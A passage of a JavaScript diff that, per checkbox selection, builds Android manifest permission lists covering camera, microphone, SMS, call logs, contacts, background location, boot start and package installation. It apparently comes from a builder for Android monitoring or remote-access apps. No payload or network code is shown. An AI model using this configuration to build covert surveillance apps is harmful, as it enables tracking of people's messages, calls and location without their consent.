+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+        // if 5 checked 
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
